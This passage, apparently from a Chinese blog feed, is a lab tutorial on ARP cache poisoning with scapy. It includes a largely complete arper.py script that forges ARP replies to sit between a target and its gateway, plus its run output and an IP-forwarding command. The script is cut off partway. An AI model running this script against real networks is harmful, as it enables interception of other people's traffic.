class="code"><pre><span class="line">kali@kali:~/Desktop$ sudo python2 arper.py </span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">[*] Setting up eth0</span><br><span class="line">[*] Gateway 172.16.244.2 is at 00:50:56:e0:90:ca</span><br><span class="line">[*] Target 172.16.244.128 is at 00:0c:29:29:31:67</span><br><span class="line">[*] Starting sniffer <span class="keyword">for</span> 1000 packets</span><br><span class="line">[*] Beginning the ARP poison. [CTRL-C to stop]</span><br><span class="line">[*] Restoring target...</span><br><span class="line">[*] Restoring target...</span><br></pre></td></tr></table></figure><h3 id="3、目标机被攻击时的arp表信息"><a href="#3、目标机被攻击时的arp表信息" class="headerlink" title="3、目标机被攻击时的arp表信息"></a>3、目标机被攻击时的arp表信息</h3><img src="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/arp2.png" width="70%" height="70%"><h3 id="4、在kali上流量转发"><a href="#4、在kali上流量转发" class="headerlink" title="4、在kali上流量转发"></a>4、在kali上流量转发</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo sysctl net.ipv4.ip_forward=1</span><br><span class="line">[sudo] password <span class="keyword">for</span> kali: </span><br><span class="line">net.ipv4.ip_forward = 1</span><br><span class="line">kali@kali:~$</span><br></pre></td></tr></table></figure><h3 id="5、目标机器访问网络"><a href="#5、目标机器访问网络" class="headerlink" title="5、目标机器访问网络"></a>5、目标机器访问网络</h3><h3 id="6、kali上数据包"><a href="#6、kali上数据包" class="headerlink" title="6、kali上数据包"></a>6、kali上数据包</h3><img src="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/pcap.png" width="70%" height="70%">如上图，绿色的为目标机器发送到kali的数据包（网关为172.16.244.139，即为kali本身），详见下图1，黑色的为kali转发到目标的数据包（网关为172.16.244.2，即为kali的网关），详见下图2.<img src="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/p1.png" width="70%" height="70%"><img src="/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/p2.png" width="70%" height="70%">]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1、目标机和kali的网络信息&quot;&gt;&lt;a href=&quot;#1、目标机和kali的网络信息&quot; class=&quot;headerlink&quot; title=&quot;1、目标机和kali的网络信息&quot;&gt;&lt;/a&gt;1、目标机和kali的网络信息&lt;/h3&gt;&lt;p&gt;目标机ip信息：&lt;br&gt;&lt;img src=&quot;/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/target.png&quot; width=&quot;70%&quot; height=&quot;70%&quot;&gt;&lt;br&gt;目标机arp表信息&lt;br&gt;&lt;img src=&quot;/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/arp.png&quot; width=&quot;70%&quot; height=&quot;70%&quot;&gt;&lt;br&gt;kali ip信息&lt;br&gt;&lt;img src=&quot;/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/kali.png&quot; width=&quot;70%&quot; height=&quot;70%&quot;&gt;&lt;br&gt;kali arp表&lt;br&gt;&lt;img src=&quot;/2020/03/01/%E5%88%A9%E7%94%A8scapy%E8%BF%9B%E8%A1%8Carp%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92/arpkali.png&quot; width=&quot;70%&quot; height=&quot;70%&quot;&gt;&lt;/p&gt;&lt;h3 id=&quot;2、编写python脚本进行arp投毒&quot;&gt;&lt;a href=&quot;#2、编写python脚本进行arp投毒&quot; class=&quot;headerlink&quot; title=&quot;2、编写python脚本进行arp投毒&quot;&gt;&lt;/a&gt;2、编写python脚本进行arp投毒&lt;/h3&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;115&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#!/usr/bin/env python&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# coding=utf-8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @File    : arper.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Time    : 2/17/20 09:24&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Author  : youyang&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# @Site    : youyang.me&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; scapy.all &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; os&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; threading&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; signal&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;set_interface&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; platform&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;global&lt;/span&gt; interface&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sysstr = platform.system()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; sysstr == &lt;span class=&quot;string&quot;&gt;&quot;Linux&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        interface = &lt;span class=&quot;string&quot;&gt;&quot;eth0&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;elif&lt;/span&gt; sysstr == &lt;span class=&quot;string&quot;&gt;&quot;Darwin&quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        interface = &lt;span class=&quot;string&quot;&gt;&quot;en0&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        interface = &lt;span class=&quot;string&quot;&gt;&quot;Ethernet0&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[*] Setting up %s&quot;&lt;/span&gt; % interface&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;get_mac&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(ip_address)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    responses, unanswered = srp(Ether(dst=&lt;span class=&quot;string&quot;&gt;&#39;ff:ff:ff:ff:ff:ff&#39;&lt;/span&gt;) / ARP(pdst=ip_address), timeout=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, retry=&lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 返回从响应数据中获取的MAC地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; s, r &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; responses:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; r[Ether].src&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;poison_target&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(gateway_ip, gateway_mac, target_ip, target_mac)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_target = ARP()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_target.op = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_target.psrc = gateway_ip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_target.pdst = target_ip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_target.hwdst = target_mac&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_gateway = ARP()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_gateway.op = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_gateway.psrc = target_ip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_gateway.pdst = gateway_ip&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    poison_gateway.hwdst = gateway_mac&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[*] Beginning the ARP poison. [CTRL-C to stop]&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;True&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            send(poison_target)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            send(poison_gateway)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            time.sleep(&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt; KeyboardInterrupt:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[*] ARP poison attack finished.&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;restore_target&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(gateway_ip, gateway_mac, target_ip, target_mac)&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 以下代码中调用send函数的方式稍有不同&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[*] Restoring target...&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    send(ARP(op=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, psrc=gateway_ip, pdst=target_ip, hwdst=&lt;span class=&quot;string&quot;&gt;&quot;ff:ff:ff:ff:ff:ff&quot;&lt;/span&gt;, hwsrc=gateway_mac), count=&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    send(ARP(op=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, psrc=target_ip, pdst=gateway_ip, hwdst=&lt;span class=&quot;string&quot;&gt;&quot;ff:ff:ff:ff:ff:ff&quot;&lt;/span&gt;, hwsrc=target_mac), count=&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;# 发出退出信号到主线程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    os.kill(os.getpid(), signal.SIGINT)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;get_current_time&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; time&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; time.strftime(&lt;span class=&quot;string&quot;&gt;&#39;%Y-%m-%d %H:%M:%S&#39;&lt;/span&gt;,time.localtime(time.time()))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;target_ip = &lt;span class=&quot;string&quot;&gt;&quot;172.16.244.128&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;gateway_ip = &lt;span class=&quot;string&quot;&gt;&quot;172.16.244.2&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;packet_count = &lt;span class=&quot;number&quot;&gt;1000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# 设置网络接口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;interface = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;set_interface()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.iface = interface&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;conf.verb = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;#获得网关和目标ip对应的mac&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;gateway_mac = get_mac(gateway_ip)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; gateway_mac &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;None&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[!!!] Failed to get gateway MAC. Exiting.&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys.exit(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[*] Gateway %s is at %s&quot;&lt;/span&gt; % (gateway_ip, gateway_mac)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;target_mac = get_mac(target_ip)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; target_mac &lt;span class=&quot;keyword&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;literal&quot;&gt;None&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;[!!!] Failed to get target MAC. Exiting.&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    sys.exit(&lt;span 